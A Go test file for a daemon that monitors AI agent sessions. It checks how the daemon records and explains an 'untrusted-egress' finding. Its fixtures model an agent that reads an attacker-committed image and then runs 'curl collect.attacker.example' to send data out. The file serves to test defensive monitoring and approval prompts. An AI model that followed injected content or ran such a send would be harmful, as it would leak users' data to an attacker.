package api

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/cavi-ai/secure-agent/daemon/internal/event"
	"github.com/cavi-ai/secure-agent/daemon/internal/guard"
	"github.com/cavi-ai/secure-agent/daemon/internal/model"
)

const untrustedImageOrigin = "committed by Mallory <mallory@attacker.example> in repo@c405510 on 2026-10-28 (docs: add build spec diagram)"

func untrustedEgressFlag(at time.Time, decision string) model.Flag {
	return model.Flag{
		ID: "ue-1", Rule: "untrusted-egress", Severity: 2, TS: at, Agent: "claude", SessionID: "s1",
		Evidence: []model.EvidenceItem{
			{Kind: "untrusted-input", Label: "Image: /work/repo/docs/build-spec.png", Sub: untrustedImageOrigin, Rule: "image", TS: at.Add(-time.Minute).Format(time.RFC3339)},
			{Kind: "untrusted-input", Label: "Web page: https://docs.example.com/install", Sub: "fetched from docs.example.com", Rule: "web", TS: at.Add(-time.Minute).Format(time.RFC3339)},
			{Kind: "send", Label: "curl collect.attacker.example", Sub: model.UntrustedDecisionLabel(decision), Rule: decision, TS: at.Format(time.RFC3339)},
		},
	}
}

// The session's memory shows that it read an image and later sent data out,
// and links the finding; the image's path stays in the finding's evidence.
func TestSessionMemoryShowsUntrustedInputAndSend(t *testing.T) {
	st := testStore(t)
	now := time.Now().UTC()
	started := now.Add(-time.Minute)
	st.UpsertSession(model.Session{ID: "s1", RootPID: 100, RootStartedAt: started.Format(time.RFC3339Nano), StartedAt: started, LastSeenAt: now})
	st.PutEvent(event.Event{Kind: event.KindPluginAction, TS: now, SessionID: "s1", Path: "untrusted-input:image", Detail: "secret-guard:allow"})
	st.PutEvent(event.Event{Kind: event.KindPluginAction, TS: now.Add(time.Second), SessionID: "s1", Path: "guard-monitor:untrusted-egress", Detail: "secret-guard:allow"})
	st.PutFlag(untrustedEgressFlag(now.Add(time.Second), "monitored"))
	a := newTestAPI(Deps{SocketPath: "", Store: st, Killer: &fakeKiller{}, Status: func() Status { return Status{Running: true} }})
	w := httptest.NewRecorder()
	a.handleSessionSubpath(w, httptest.NewRequest(http.MethodGet, "/sessions/s1/memory", nil))
	if w.Code != 200 {
		t.Fatalf("HTTP %d: %s", w.Code, w.Body.String())
	}
	var out memoryResponse
	if err := json.Unmarshal(w.Body.Bytes(), &out); err != nil {
		t.Fatal(err)
	}
	got := map[string]string{}
	for _, row := range out.Rows {
		got[row.Kind+"|"+row.Title] = row.Detail + "|" + row.SourceID
	}
	for key, want := range map[string]string{
		"guard-audit|Untrusted input: Image":             "Later sends from this session are checked|",
		"guard-audit|Send after untrusted input":         "Decision: allow (monitor mode)|",
		"flag|Data sent after reading untrusted content": "|ue-1",
	} {
		if got[key] != want {
			t.Fatalf("memory row %q = %q, want %q; rows %+v", key, got[key], want, out.Rows)
		}
	}
	if decoded := fmt.Sprintf("%+v", out.Rows); strings.Contains(decoded, "build-spec.png") || strings.Contains(decoded, "Mallory") {
		t.Fatalf("memory rows carry the input's location: %s", decoded)
	}
}

// The finding states what was read, what it was sent through and what the
// guard did, and its assessment names the control outcome.
func TestUntrustedEgressFindingReadsPlainly(t *testing.T) {
	if got := humanFlagTitle("untrusted-egress"); got != "Data sent after reading untrusted content" {
		t.Fatalf("title = %q", got)
	}
	f := untrustedEgressFlag(time.Now(), "monitored")
	what := explainWhat(f, &model.FlagExplain{}, nil)
	want := familyTitle("claude") + " read an image (build-spec.png) and 1 more untrusted input, then sent data out through curl collect.attacker.example. Guard: ran; monitor mode records it."
	if what != want {
		t.Fatalf("what = %q\nwant %q", what, want)
	}
	a := model.AssessFinding(f)
	if a.Risk != "review" || a.Control != "observed-only" || a.ResidualRisk != "possible-exposure" || !strings.Contains(a.Reason, "sent data out") {
		t.Fatalf("monitored assessment = %+v", a)
	}
	blocked := model.AssessFinding(untrustedEgressFlag(time.Now(), "denied"))
	if blocked.Control != "blocked" || blocked.ResidualRisk != "none-established" {
		t.Fatalf("denied assessment = %+v", blocked)
	}
	allowed := model.AssessFinding(untrustedEgressFlag(time.Now(), "allowed"))
	if allowed.Control != "allowed" {
		t.Fatalf("allowed assessment = %+v", allowed)
	}
}

// The pending prompt for a send after untrusted input shows the hook's reason
// line, without control characters and bounded, and scope text about sends.
func TestGuardPendingShowsUntrustedEgressReason(t *testing.T) {
	st := testStore(t)
	a := newTestAPI(Deps{SocketPath: "", Store: st, Killer: &fakeKiller{}, Status: func() Status { return Status{Running: true} }, Guard: GuardDeps{Broker: guard.NewBroker(5 * time.Second)}})
	reason := "This session read untrusted content: image /work/repo/docs/build-spec.png, " + untrustedImageOrigin + ".\u001b[2J It now sends data out: curl collect.attacker.example." + strings.Repeat(" padding", 100)
	body, _ := json.Marshal(map[string]string{"agent": "claude", "tool": "Bash", "path": "curl collect.attacker.example", "rule_id": "untrusted-egress", "detail": reason})
	ctx, cancel := context.WithCancel(context.Background())
	done := make(chan struct{})
	t.Cleanup(func() {
		cancel()
		<-done
	})
	go func() {
		defer close(done)
		a.handleGuardDecision(httptest.NewRecorder(), httptest.NewRequest(http.MethodPost, "/guard/decision", strings.NewReader(string(body))).WithContext(ctx))
	}()
	var pending []guard.Pending
	for deadline := time.Now().Add(2 * time.Second); time.Now().Before(deadline); time.Sleep(10 * time.Millisecond) {
		rec := httptest.NewRecorder()
		a.handleGuardPending(rec, httptest.NewRequest(http.MethodGet, "/guard/pending", nil))
		if err := json.Unmarshal(rec.Body.Bytes(), &pending); err == nil && len(pending) == 1 {
			break
		}
	}
	if len(pending) != 1 {
		t.Fatalf("pending = %+v, want 1", pending)
	}
	p := pending[0]
	if !strings.HasPrefix(p.Detail, "This session read untrusted content: image /work/repo/docs/build-spec.png, committed by Mallory <mallory@attacker.example>") ||
		strings.ContainsRune(p.Detail, 0x1b) || len([]rune(p.Detail)) != 600 {
		t.Fatalf("detail = %d runes %q", len([]rune(p.Detail)), p.Detail)
	}
	if !strings.Contains(p.ScopeText, "only the sends named here") || strings.Contains(p.ScopeText, "File approval") {
		t.Fatalf("scope text = %q", p.ScopeText)
	}
	a.guardBroker.Resolve(p.ID, guard.Decision{Verdict: "deny", Scope: "once"})
}
